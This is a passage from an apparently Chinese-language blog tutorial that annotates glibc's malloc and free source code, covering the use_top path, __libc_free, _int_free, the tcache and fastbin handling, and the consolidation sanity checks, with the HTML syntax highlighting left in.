rest of block if there are no more set bits in this block.  */</span><br>       <span class="hljs-comment">//Skip rest of block if there are no more set bits in this block.</span><br>       <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>       &#123;<span class="hljs-comment">//当前bit为0 或者 chunk后面的bit也等于0(bit &gt; map), idx2bit()不可能得到0,应该是循环下面的部分</span><br>           <span class="hljs-keyword">do</span><br>           &#123;<br>               <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                   <span class="hljs-keyword">goto</span> use_top;	<span class="hljs-comment">//没有的话只能够使用top chunk了</span><br>           &#125; <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);	<span class="hljs-comment">//不等零</span><br><br>           bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));	<span class="hljs-comment">//取到了更大且非空的bin</span><br>           bit = <span class="hljs-number">1</span>;<br>       &#125;<br><br>       <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>       <span class="hljs-comment">//1.没有经过上面的if,原map中就大于等于bit, 从原bit位开始左移</span><br>       <span class="hljs-comment">//2.经过了上面的if,bit从最低位开始左移</span><br>       <span class="hljs-comment">//从bit位开始找bin header, 肯定是存在的</span><br>       <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<br>       &#123;<br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>           assert(bit != <span class="hljs-number">0</span>);<br>       &#125;<br><br>       <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>       <span class="hljs-comment">//既然比nb都大, 就选一个最右边的, 这样在largebin中还是最小的</span><br>       victim = last(bin);<br><br>       <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>       <span class="hljs-comment">// 如果victim=bin，那么我们就将map对应的位清0，然后获取下一个bin</span><br>       <span class="hljs-comment">// 这种情况发生的概率应该很小。</span><br>       <span class="hljs-keyword">if</span> (victim == bin)<br>       &#123;<br>           av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>       &#125;<br>       <span class="hljs-keyword">else</span><br>       &#123;<br>           size = chunksize(victim);<br><br>           <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>           assert((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb));<br>           <br>           remainder_size = size - nb;<br><br>           <span class="hljs-comment">/* unlink */</span><br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span class="hljs-comment">//不够就整块送出去</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><br>           &#123;<span class="hljs-comment">//够了就分割</span><br>               remainder = chunk_at_offset(victim, nb);<br><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<br><br>               <span class="hljs-comment">/* advertise as last remainder */</span><br>               <span class="hljs-comment">// 如果在small bin范围内，就将其标记为remainder</span><br>               <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>                   av-&gt;last_remainder = remainder;<br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>

<h3 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br>    <span class="hljs-comment">/*   没看懂写了啥(replenished,fenceposts)</span><br><span class="hljs-comment">         If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">         less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">         be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">         limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">         MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">         exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">         reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">         to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">       */</span><br><br>    victim = av-&gt;top;<br>    size = chunksize(victim);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE))<br>    &#123;<span class="hljs-comment">//如果top足够大, 就分割</span><br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset(victim, nb);<br>        av-&gt;top = remainder;<br>        set_head(victim, nb | PREV_INUSE |<br>                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head(remainder, remainder_size | PREV_INUSE);<br><br>        check_malloced_chunk(av, victim, nb);<br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>    <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">         here for all block sizes.  */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>    &#123;<span class="hljs-comment">//如果不够大且当前arena有fastchunk, 再次malloc_consolidate()等待下一次循环是否可行</span><br>        malloc_consolidate(av);<br>        <span class="hljs-comment">/* restore original bin index */</span><br>        <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>            idx = smallbin_index(nb);<br>        <span class="hljs-keyword">else</span><br>            idx = largebin_index(nb);<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">       */</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<span class="hljs-comment">//啥都没有, 直接sysmalloc()增加topchunk,并且return跳出循环</span><br>        <span class="hljs-keyword">void</span> *p = sysmalloc(nb, av);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="释放内存块"><a href="#释放内存块" class="headerlink" title="释放内存块"></a>释放内存块</h1><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __libc_free(<span class="hljs-keyword">void</span> *mem) &#123;<br>    mstate    ar_ptr;<br>    mchunkptr p; <span class="hljs-comment">/* chunk corresponding to mem */</span><br>    <span class="hljs-comment">// 判断是否有钩子函数 __free_hook</span><br>    <span class="hljs-keyword">void</span> (*hook)(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) = atomic_forced_read(__free_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        (*hook)(mem, RETURN_ADDRESS(<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// free NULL没有作用</span><br>    <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>) <span class="hljs-comment">/* free(0) has no effect */</span><br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 将mem转换为chunk状态</span><br>    p = mem2chunk(mem);<br>    <span class="hljs-comment">// 如果该块内存是mmap得到的</span><br>    <span class="hljs-keyword">if</span> (chunk_is_mmapped(p)) <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>        <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment">       Dumped fake mmapped chunks do not affect the threshold.  */</span><br>        <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold &amp;&amp;<br>            chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp;<br>            !DUMPED_MAIN_ARENA_CHUNK(p)) &#123;<br>            mp_.mmap_threshold = chunksize(p);<br>            mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                       mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>        munmap_chunk(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    MAYBE_INIT_TCACHE (); <span class="hljs-comment">//唯一的tcache</span><br>    <br>    <span class="hljs-comment">// 根据chunk获得分配区的指针</span><br>    ar_ptr = arena_for_chunk(p);<br>    <span class="hljs-comment">// 执行释放</span><br>    _int_free(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="变量定义-1"><a href="#变量定义-1" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<br></code></pre></td></tr></table></figure>

<h3 id="小检查-amp-tcache"><a href="#小检查-amp-tcache" class="headerlink" title="小检查 &amp; tcache"></a>小检查 &amp; tcache</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">       allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">       Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">       here by accident or by &quot;design&quot; from some intruder.  */</span><br>    <span class="hljs-comment">// 指针不能指向非法的地址, 必须小于等于-size，为什么？？？</span><br>    <span class="hljs-comment">// 指针必须得对齐，2*SIZE_SZ 这个对齐</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect((<span class="hljs-keyword">uintptr_t</span>) p &gt; (<span class="hljs-keyword">uintptr_t</span>) -size, <span class="hljs-number">0</span>) ||<br>        __builtin_expect(misaligned_chunk(p), <span class="hljs-number">0</span>)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>        <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked) __libc_lock_unlock(av-&gt;mutex);<br>        malloc_printerr(check_action, errstr, chunk2mem(p), av);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">       multiple of MALLOC_ALIGNMENT.  */</span><br>    <span class="hljs-comment">// 大小没有最小的chunk大，或者说，大小不是MALLOC_ALIGNMENT的整数倍</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-comment">// 检查该chunk是否处于使用状态，非调试状态下没有作用</span><br>    check_inuse_chunk(av, p);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br><br>    <span class="hljs-keyword">if</span> (tcache<br>	&amp;&amp; tc_idx &lt; mp_.tcache_bins<br>	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>      &#123;<br>	tcache_put (p, tc_idx);<br>	<span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></td></tr></table></figure>

<p>其中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p)                                                    \</span><br><span class="hljs-meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span><br><span class="hljs-meta">     MALLOC_ALIGN_MASK)</span><br></code></pre></td></tr></table></figure>

<h3 id="on-fastbin"><a href="#on-fastbin" class="headerlink" title="on fastbin"></a>on fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If eligible, place chunk on a fastbin so it can be found</span><br><span class="hljs-comment">    and used quickly in malloc.</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast ())<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> TRIM_FASTBINS</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">	If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">	bordering top into fastbins </span><br><span class="hljs-comment">      */</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) <span class="hljs-comment">//这个宏是在if语句里加上一条,意义是p不和top chunk相邻</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>      ) &#123;<br><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))<br>			  &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>	|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>			     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br>	<span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">	   of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">	   after getting the lock.  */</span><br>	<span class="hljs-keyword">if</span> (have_lock<br>	    || (&#123; assert (locked == <span class="hljs-number">0</span>);<br>		  __libc_lock_lock (av-&gt;mutex);<br>		  locked = <span class="hljs-number">1</span>;<br>		  chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>	      &#125;))<br>	  &#123;<br>	    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>	    <span class="hljs-keyword">goto</span> errout;<br>	  &#125;<br>	<span class="hljs-keyword">if</span> (! have_lock)<br>	  &#123;<br>	    __libc_lock_unlock (av-&gt;mutex);<br>	    locked = <span class="hljs-number">0</span>;<br>	  &#125;<br>      &#125;<br>	<span class="hljs-comment">// 将chunk的mem部分全部设置为perturb_byte</span><br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>	<span class="hljs-comment">// 设置fast chunk的标记位</span><br>    set_fastchunks(av);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx = fastbin_index(size);<br>    fb = &amp;fastbin (av, idx); <span class="hljs-comment">//取出fastbin头指针</span><br><br>    <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>    <span class="hljs-comment">//多线程相关, 跳过</span><br>    mchunkptr old = *fb, old2;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> old_idx = ~<span class="hljs-number">0u</span>;	<span class="hljs-comment">//不就是1 吗?</span><br>    <span class="hljs-keyword">do</span><br>      &#123;<br>	<span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">	   (i.e., double free).  */</span><br>	<span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>	  &#123; <span class="hljs-comment">//防止对 fast bin double free</span><br>	    errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>	    <span class="hljs-keyword">goto</span> errout;<br>	  &#125;<br>	<span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">	   size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">	   only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">	   deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>	<span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>	  old_idx = fastbin_index(chunksize(old));<br>	p-&gt;fd = old2 = old;<br>      &#125;<br>    <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br><br>    <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>      &#123;<br>	errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>	<span class="hljs-keyword">goto</span> errout;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>

<h3 id="合并非-mmap-的空闲-chunk"><a href="#合并非-mmap-的空闲-chunk" class="headerlink" title="合并非 mmap 的空闲 chunk"></a>合并非 mmap 的空闲 chunk</h3><p><strong>只有不是 fast bin 的情况下才会触发 unlink</strong></p>
<p>首先我们先说一下为什么会合并 chunk，这是为了避免 heap 中有太多零零碎碎的内存块，合并之后可以用来应对更大的内存块请求。合并的主要顺序为</p>
<ul>
<li>先考虑物理低地址空闲块</li>
<li>后考虑物理高地址空闲块</li>
</ul>
<p><strong>合并后的 chunk 指向合并的 chunk 的低地址。</strong></p>
<p>在没有锁的情况下，先获得锁。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  Consolidate other non-mmapped chunks as they arrive.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>    <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>        __libc_lock_lock(av-&gt;mutex);<br>        locked = <span class="hljs-number">1</span>;<br>    &#125;<br>    nextchunk = chunk_at_offset(p, size);<br></code></pre></td></tr></table></figure>

<h4 id="轻量级的检测"><a href="#轻量级的检测" class="headerlink" title="轻量级的检测"></a>轻量级的检测</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">   top block.  */</span><br><span class="hljs-comment">// 当前free的chunk不能是top chunk</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(p == av-&gt;top)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 当前free的chunk的下一个chunk不能超过arena的边界</span><br><span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br><span class="hljs-keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp;<br>                         (<span class="hljs-keyword">char</span> *) nextchunk &gt;=<br>                             ((<span class="hljs-keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)),<br>                     <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 当前要free的chunk的使用标记没有被标记，double free</span><br><span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk))) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 下一个chunk的大小</span><br>nextsize = chunksize(nextchunk);<br><span class="hljs-comment">// next chunk size valid check</span><br><span class="hljs-comment">// 判断下一个chunk的大小是否不大于2*SIZE_SZ，或者</span><br><span class="hljs-comment">// nextsize是否大于系统可提供的内存</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(nextchunk) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||<br>    __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> 